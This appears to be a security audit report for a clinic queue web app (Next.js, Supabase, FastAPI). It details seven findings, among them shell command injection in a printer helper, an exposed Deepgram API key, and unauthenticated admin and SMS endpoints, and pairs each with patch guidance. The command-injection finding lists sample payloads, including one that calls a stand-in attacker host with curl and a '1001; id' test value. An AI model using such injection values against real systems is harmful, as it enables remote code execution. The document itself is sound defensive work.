# Heart Check PHC: Security Audit Report - API Leaks and Injection Risks

This document provides a comprehensive security assessment of the Heart Check PHC codebase, detailing all identified API leaks, credential exposures, injection vulnerabilities, and broken access control risks, along with actionable technical patch instructions and verification procedures.

---

## 1. Executive Summary & Audit Scope

A static code analysis and architectural security review was conducted across the full Heart Check PHC repository:
- **Frontend Layer:** Next.js 16 App Router (`app/`), React presentation components, client-side hooks, and Server Actions (`app/actions/`).
- **Server Middleware & Route Handlers:** Next.js Edge Proxy (`proxy.ts`), authentication endpoints (`app/api/auth/`), hardware integration routes (`app/api/print-ticket/`), and administrative routes (`app/api/superadmin/`).
- **Database & Data Access Layer:** Supabase client wrappers (`lib/supabase/`), Row Level Security policies, RPC functions, and offline mutation queues (`lib/offlineQueue.ts`).
- **Analytical Backend:** FastAPI Python service (`python_backend/`), statistical forecasting modules, and Excel workbook generator.

### Audit Findings Overview

| Finding ID | Classification | Severity | Affected Component | Target File | Status |
| :--- | :--- | :---: | :--- | :--- | :---: |
| **SEC-AUD-001** | Command Injection | **CRITICAL** | Shell command interpolation via `child_process.exec()` | [lib/printer.ts](file:///home/jensen/Github-Repositories/heart-check-phc/lib/printer.ts#L41) | [PTCH] |
| **SEC-AUD-002** | Credential Exposure | **HIGH** | Third-party Deepgram API token exposed in browser bundle | [useMonitorData.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/monitor/hooks/useMonitorData.ts#L31), [RegistrationLayout.tsx](file:///home/jensen/Github-Repositories/heart-check-phc/app/monitor/components/RegistrationLayout.tsx#L37), [transfer/page.tsx](file:///home/jensen/Github-Repositories/heart-check-phc/app/transfer/page.tsx#L391), [nurse/page.tsx](file:///home/jensen/Github-Repositories/heart-check-phc/app/nurse/page.tsx#L192) | [PTCH] |
| **SEC-AUD-003** | Broken Access Control | **HIGH** | Unauthenticated SuperAdmin user sync route using Service Role Key | [app/api/superadmin/sync-users/route.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/api/superadmin/sync-users/route.ts#L9-L40) | [PTCH] |
| **SEC-AUD-004** | Mass Assignment / BOLA | **HIGH** | Unvalidated column mutations and missing historical record protections | [app/api/rotate/route.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/api/rotate/route.ts#L23-L30) | [PTCH] |
| **SEC-AUD-005** | Toll Fraud / Rate Limiting | **MEDIUM** | Unauthenticated, unthrottled SMS dispatch Server Action | [app/actions/sendSMS.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/actions/sendSMS.ts#L3-L53) | [PTCH] |
| **SEC-AUD-006** | Hardware Abuse / DoS | **MEDIUM** | Unauthenticated thermal printer trigger and unescaped ESC/POS input | [app/api/print-ticket/route.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/api/print-ticket/route.ts#L21-L66) | [PTCH] |
| **SEC-AUD-007** | Historical Immutability | **LOW** | Missing defensive `is_historical = false` filters on operational updates | [app/nurse/hooks/useNurseActions.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/nurse/hooks/useNurseActions.ts#L97-L100), `app/transfer/hooks/` | [PTCH] |

---

## 2. Detailed Vulnerability Analyses & Patch Guidance

### SEC-AUD-001: OS Command Injection via Shell Interpolation (CRITICAL)

- **Location:** [lib/printer.ts](file:///home/jensen/Github-Repositories/heart-check-phc/lib/printer.ts#L41)
- **Vulnerability Type:** CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
- **Vulnerable Code:**
  ```typescript
  // lib/printer.ts:41
  exec(`echo -e "${ticket}" > /dev/usb/lp2`, (error) => {
    if (error) { ... }
  });
  ```
- **Mechanics:**
  The `sendToPrinter` helper function constructs the `ticket` string using template literal interpolation of `patientNum`, `serviceName`, and `cubicle`. It then passes the raw string into `exec()`. Node.js `child_process.exec()` invokes the host shell (`/bin/sh -c`).
- **Threat & Impact:**
  If an adversary submits a patient record or ticket number containing shell metacharacters (e.g. `; id;`, `$(curl http://attacker.com)`, or `` `whoami` ``), the shell executes the injected commands under the UID of the running Node.js process, yielding complete remote code execution (RCE) on the server.
- **Remediation:**
  1. Remove [lib/printer.ts](file:///home/jensen/Github-Repositories/heart-check-phc/lib/printer.ts) entirely, as it is an unreferenced legacy file superseded by the route handler in [app/api/print-ticket/route.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/api/print-ticket/route.ts).
  2. If direct filesystem writes to the thermal printer are required, use `fs/promises.writeFile('/dev/usb/lp2', buffer)` which does not invoke a shell.

---

### SEC-AUD-002: Third-Party Deepgram API Key Exposed in Client Bundle (HIGH)

- **Locations:**
  - [app/monitor/hooks/useMonitorData.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/monitor/hooks/useMonitorData.ts#L31)
  - [app/monitor/components/RegistrationLayout.tsx](file:///home/jensen/Github-Repositories/heart-check-phc/app/monitor/components/RegistrationLayout.tsx#L37)
  - [app/transfer/page.tsx](file:///home/jensen/Github-Repositories/heart-check-phc/app/transfer/page.tsx#L391)
  - [app/nurse/page.tsx](file:///home/jensen/Github-Repositories/heart-check-phc/app/nurse/page.tsx#L192)
  - [.env.local](file:///home/jensen/Github-Repositories/heart-check-phc/.env.local#L14)
- **Vulnerability Type:** CWE-522: Insufficiently Protected Credentials / CWE-798: Use of Hard-coded Credentials
- **Vulnerable Code:**
  ```typescript
  // app/monitor/hooks/useMonitorData.ts:31
  const response = await fetch(
    'https://api.deepgram.com/v1/speak?model=aura-2-amalthea-en',
    {
      method: 'POST',
      headers: {
        'Authorization': `Token ${process.env.NEXT_PUBLIC_DEEPGRAM_KEY}`,
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ text }),
    }
  );
  ```
- **Mechanics:**
  In Next.js, environment variables prefixed with `NEXT_PUBLIC_` are inlined into the client-side JavaScript bundle during compilation. Four separate client components invoke the external Deepgram API directly from the browser using this key.
- **Threat & Impact:**
  Any user visiting `/monitor`, `/nurse`, or `/transfer` can inspect the browser Network tab or bundle sources to retrieve the raw Deepgram API key. Attackers can abuse this token to incur financial costs or exhaust quota on PHC's Deepgram account.
- **Remediation:**
  1. Rename the environment variable in `.env.local` to `DEEPGRAM_API_KEY` (stripping the `NEXT_PUBLIC_` prefix).
  2. Implement a server-side route handler at `app/api/tts/route.ts` that receives the text payload, attaches the server-side `process.env.DEEPGRAM_API_KEY`, calls Deepgram, and streams the resulting audio binary back to the client.

---

### SEC-AUD-003: Unauthenticated SuperAdmin User Synchronization Endpoint (HIGH)

- **Location:** [app/api/superadmin/sync-users/route.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/api/superadmin/sync-users/route.ts#L9-L40)
- **Vulnerability Type:** CWE-306: Missing Authentication for Critical Function
- **Vulnerable Code:**
  ```typescript
  // app/api/superadmin/sync-users/route.ts:9
  export async function POST() {
    try {
      const { data: authUsers, error: authError } = await supabaseAdmin.auth.admin.listUsers();
      ...
      const { data: existingUsers } = await supabaseAdmin.from('users').select('id');
      ...
      for (const user of missingUsers) {
        await supabaseAdmin.from('users').insert({
          id: user.id,
          email: user.email,
          username: user.email?.split('@')[0],
          role: 'registration' 
        });
      }
      return NextResponse.json({
        message: `Synced ${missingUsers.length} users`,
        synced: missingUsers.length
      });
  ```
- **Mechanics:**
  [proxy.ts](file:///home/jensen/Github-Repositories/heart-check-phc/proxy.ts) excludes all `/api/*` endpoints from middleware checks. While sibling routes in `app/api/superadmin/` invoke `requireSuperadmin(request)`, `sync-users` does not import or execute any guard. It uses `supabaseAdmin` (which holds `SUPABASE_SERVICE_ROLE_KEY` and bypasses RLS) to query the Supabase Auth Admin API and insert user records.
- **Threat & Impact:**
  An unauthenticated actor on the hospital LAN or Internet can send a `POST /api/superadmin/sync-users` request, forcing administrative user directory synchronization, triggering state modifications, and extracting database error metadata.
- **Remediation:**
  Enforce the superadmin guard at the start of the `POST` handler:
  ```typescript
  import { requireSuperadmin } from '@/lib/supabase/superadminGuard';

  export async function POST(request: Request) {
    const guard = await requireSuperadmin(request);
    if (!guard.authorized) return guard.response;
    ...
  ```

---

### SEC-AUD-004: Mass Assignment & Historical Data Mutation in `/api/rotate` (HIGH)

- **Location:** [app/api/rotate/route.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/api/rotate/route.ts#L23-L30)
- **Vulnerability Type:** CWE-915: Improperly Controlled Modification of Dynamically Determined Object Attributes / CWE-639: Authorization Bypass Through User-Controlled Key
- **Vulnerable Code:**
  ```typescript
  // app/api/rotate/route.ts:24
  let query = supabaseAdmin.from('patients').update(changes).eq('id', id);
  for (const [column, value] of Object.entries(expected ?? {})) {
    query = value === null ? query.is(column, null) : query.eq(column, value);
  }
  ```
- **Mechanics:**
  1. The handler accepts an unvalidated `changes` dictionary from the request body and forwards it directly to `.update(changes)`.
  2. The operation executes using `supabaseAdmin` (`SUPABASE_SERVICE_ROLE_KEY`), bypassing all PostgreSQL Row Level Security policies.
  3. The update query omits `.eq('is_historical', false)`, violating the mandatory historical data protection standard (Rule 12).
  4. The route only calls `requireUser(request)`: any authenticated user (e.g. low-privilege registration staff or kiosk) can submit updates for arbitrary patient IDs without ownership or cubicle assignment checks.
- **Threat & Impact:**
  An authenticated actor can modify arbitrary fields on patient rows (such as medical notes, status, timestamps, or flags) and alter historical research data used for forecasting models.
- **Remediation:**
  1. Validate incoming mutation fields against a strict Zod schema whitelist (permitting only `cubicleNum`, `status`, and operational timestamps).
  2. Enforce clinical roles (`nurse`, `staff`, `doctor`, `admin`).
  3. Explicitly append `.eq('is_historical', false)` to prevent mutation of research records.

---

### SEC-AUD-005: Unauthenticated SMS Dispatcher Server Action (MEDIUM)

- **Location:** [app/actions/sendSMS.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/actions/sendSMS.ts#L3-L53)
- **Vulnerability Type:** CWE-306: Missing Authentication / CWE-770: Allocation of Resources Without Limits or Throttling
- **Vulnerable Code:**
  ```typescript
  // app/actions/sendSMS.ts:3
  'use server';

  export async function sendSMS(phoneNum: string, patientNum: string, cubicleNum: string) {
    ...
    const credentials = Buffer.from(`${process.env.UNISMS_API_KEY}:`).toString('base64');
    const response = await fetch("https://unismsapi.com/api/sms", { ... });
  ```
- **Mechanics:**
  In Next.js, every function exported with `'use server'` generates a public HTTP endpoint callable by any client. `sendSMS` accepts `phoneNum`, `patientNum`, and `cubicleNum` and dispatches messages via the UniSMS gateway without verifying session cookies, checking caller authorization, or applying rate limits.
- **Threat & Impact:**
  An external actor who observes or scans for Next.js Action IDs can invoke `sendSMS` with arbitrary phone numbers and spam payloads, exhausting the hospital's UniSMS credit balance and engaging in toll fraud or SMS bombing.
- **Remediation:**
  1. Validate that the caller has an active, authenticated clinical session via `createServerClient`.
  2. Validate `phoneNum` against Philippine mobile carrier number formats (`/^(09|\+639)\d{9}$/`).
  3. Enforce rate limiting per client IP and per destination phone number using an attempt tracking table or in-memory token bucket.

---

### SEC-AUD-006: Unauthenticated Thermal Printer Route & ESC/POS Formatting (MEDIUM)

- **Location:** [app/api/print-ticket/route.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/api/print-ticket/route.ts#L21-L66)
- **Vulnerability Type:** CWE-306: Missing Authentication / CWE-20: Improper Input Validation
- **Mechanics:**
  `POST /api/print-ticket` accepts unauthenticated requests. Although it queries `patients` with `eq('patientNum', queueNumber)`, the code continues and prints ticket data to `/dev/usb/lp*` even if `patientRecord` is null/empty. Furthermore, `queueNumber`, `serviceName`, and `cubicle` are not stripped of non-printable ESC/POS control characters (`\x1b`, `\x1d`).
- **Threat & Impact:**
  Any device on the hospital local network can flood `/api/print-ticket` with fictitious ticket numbers to exhaust thermal paper rolls, or inject binary escape sequences that could put the physical printer into an error state.
- **Remediation:**
  1. Verify `patientRecord` existence: if no matching record is found, return `HTTP 404` without sending bytes to the printer device.
  2. Validate input strings using a Zod schema restricting characters to alphanumeric, spaces, and hyphens.

---

### SEC-AUD-007: Missing Explicit `is_historical = false` Mutation Filters (LOW)

- **Locations:**
  - [app/nurse/hooks/useNurseActions.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/nurse/hooks/useNurseActions.ts#L97-L100)
  - [app/transfer/hooks/useIdlePatients.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/transfer/hooks/useIdlePatients.ts#L39)
  - [app/transfer/hooks/useTransferSelection.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/transfer/hooks/useTransferSelection.ts#L223)
  - [app/transfer/hooks/usePatientData.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/transfer/hooks/usePatientData.ts#L45-L53)
- **Vulnerability Type:** CWE-653: Improper Adherence to Principle of Least Privilege / Defense-in-Depth
- **Mechanics:**
  Operational workstations perform client-side updates against Supabase using queries structured as `.from('patients').update(updates).eq('id', patientId)`. While database Row Level Security should reject updates to historical rows, client queries do not explicitly assert `.eq('is_historical', false)` as required by Rule 12 of `AGENTS.md`.
- **Remediation:**
  Append `.eq('is_historical', false)` to every operational `update` and `delete` query targeting the `patients` table.

---

## 3. Verified System Security Strengths

The audit confirmed several well-implemented defensive controls across the repository:

1. **Zero Raw SQL Injection:** All database interactions in both Next.js and Python FastAPI use parameterized query builders (`supabase-js` and `supabase-py`). No raw SQL string concatenation (`f"SELECT ... {input}"`) exists anywhere in the codebase.
2. **Zero Cross-Site Scripting (XSS):** No instances of `dangerouslySetInnerHTML`, `eval()`, or `new Function()` exist. React's automatic entity escaping safely renders all patient numbers, names, and clinical notes.
3. **Supabase Service Role Isolation:** `SUPABASE_SERVICE_ROLE_KEY` is not prefixed with `NEXT_PUBLIC_` and is isolated to server runtimes ([lib/supabase/admin.ts](file:///home/jensen/Github-Repositories/heart-check-phc/lib/supabase/admin.ts), route handlers, and data import tools).
4. **Server-Side Route Guarding:** [proxy.ts](file:///home/jensen/Github-Repositories/heart-check-phc/proxy.ts) enforces server-side authentication and role-based access control for `/superadmin`, `/dashboard`, `/nurse`, and `/transfer` before delivering HTML to the browser.
5. **Read-Only Analytical API:** All endpoints in [python_backend/main.py](file:///home/jensen/Github-Repositories/heart-check-phc/python_backend/main.py) are strictly read-only `GET` endpoints with typed parameters, local CORS origin filtering, and NaN/Infinity sanitization.
6. **Authentication Protections:** The login route ([app/api/auth/login/route.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/api/auth/login/route.ts)) enforces brute-force lockout thresholds via `login_attempts`, and password recovery enforces rate limits via `password_reset_attempts`.

---

## 4. Remediation Priority Matrix & Action Plan

| Priority | Remediation Action | Affected File | Process to Check | Expected Output | Status |
| :---: | :--- | :--- | :--- | :--- | :---: |
| **P0** | Eliminate OS command injection by deleting or rewriting printer helper | [lib/printer.ts](file:///home/jensen/Github-Repositories/heart-check-phc/lib/printer.ts) | 1. Search codebase for `child_process.exec()`.<br>2. Call `sendToPrinter("1001; id", "OPD", "C1")`. | No `child_process.exec` invocations exist; direct `fs.writeFile` writes to `/dev/usb/lp*`; command characters are stripped without shell execution. | [x] Patched |
| **P0** | Enforce `requireSuperadmin` guard on user sync route | [app/api/superadmin/sync-users/route.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/api/superadmin/sync-users/route.ts) | Send unauthenticated request: `curl -X POST http://localhost:3000/api/superadmin/sync-users`. | HTTP 401 Unauthorized `{"error":"Not authenticated"}`; unauthenticated sync requests rejected without modifying database. | [x] Patched |
| **P1** | Move Deepgram TTS calls server-side and remove `NEXT_PUBLIC_` key | [useMonitorData.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/monitor/hooks/useMonitorData.ts), [RegistrationLayout.tsx](file:///home/jensen/Github-Repositories/heart-check-phc/app/monitor/components/RegistrationLayout.tsx), [transfer/page.tsx](file:///home/jensen/Github-Repositories/heart-check-phc/app/transfer/page.tsx), [nurse/page.tsx](file:///home/jensen/Github-Repositories/heart-check-phc/app/nurse/page.tsx), [app/api/tts/route.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/api/tts/route.ts) | Trigger queue speech on `/monitor` or `/nurse`; inspect browser DevTools Network tab and check for `NEXT_PUBLIC_DEEPGRAM_KEY` in bundle. | Requests routed through `POST /api/tts` returning `audio/mp3`; Deepgram API key is absent from client bundle assets. | [x] Patched |
| **P1** | Apply schema whitelisting and `is_historical = false` check to `/api/rotate` | [app/api/rotate/route.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/api/rotate/route.ts) | Send authenticated POST with non-whitelisted attribute (e.g. `medical_notes`) or targeting a row where `is_historical = true`. | Non-whitelisted fields stripped; queries condition on `.eq('is_historical', false)`; historical records cannot be updated (`applied: false`). | [x] Patched |
| **P1** | Add session verification and rate limiting to `sendSMS` action | [app/actions/sendSMS.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/actions/sendSMS.ts) | 1. Call `sendSMS` without active session.<br>2. Pass invalid phone `12345`.<br>3. Send >20 messages in 60 seconds. | 1. `{ error: 'Unauthorized: Active clinical session required...' }`<br>2. `{ error: 'Invalid Philippine phone number format...' }`<br>3. `{ error: 'SMS dispatch rate limit exceeded...' }` | [x] Patched |
| **P2** | Require verified `patientRecord` before thermal ticket printing | [app/api/print-ticket/route.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/api/print-ticket/route.ts) | Send POST to `/api/print-ticket` with fictitious `queueNumber: "99999"`. | HTTP 404 Not Found `{"error":"Queue ticket not found or invalid for printing."}`; zero bytes written to `/dev/usb/lp*`. | [x] Patched |
| **P2** | Append `.eq('is_historical', false)` to all client update mutations | `app/nurse/hooks/`, `app/transfer/hooks/`, `lib/offlineQueue.ts` | Inspect every `.update()` statement on the `patients` table across workstation hooks and offline queue sync. | All operational mutation queries explicitly condition on `.eq('is_historical', false)`, preventing research data corruption. | [x] Patched |

---

## 5. "Where to Edit" Security Configuration Map

| Security Aspect | Target Location | Description |
| :--- | :--- | :--- |
| **Server-Side Route Middleware** | [proxy.ts](file:///home/jensen/Github-Repositories/heart-check-phc/proxy.ts) | Role routing rules and cookie validation |
| **SuperAdmin Guards** | [lib/supabase/superadminGuard.ts](file:///home/jensen/Github-Repositories/heart-check-phc/lib/supabase/superadminGuard.ts) | `requireSuperadmin` token validation helper |
| **Authentication Handlers** | `app/api/auth/` | Login lockout, password reset, change password |
| **Hardware Printers** | [app/api/print-ticket/route.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/api/print-ticket/route.ts) | Thermal printer device buffer writing |
| **Server Actions** | [app/actions/sendSMS.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/actions/sendSMS.ts) | UniSMS dispatch server action |
| **TTS Audio Proxy** | [app/api/tts/route.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/api/tts/route.ts) | Server-side Deepgram audio synthesis proxy |
| **Patient Rotation Route** | [app/api/rotate/route.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/api/rotate/route.ts) | Dynamic queue rebalancing and status mutations |
| **Database Policies** | `docs/CHANGES_NEEDED.md`, `docs/SECURITY.md` | Supabase RLS and database trigger definitions |
| **FastAPI Analytics Security** | [python_backend/main.py](file:///home/jensen/Github-Repositories/heart-check-phc/python_backend/main.py) | CORS origins, query validation, and drilldown caching |
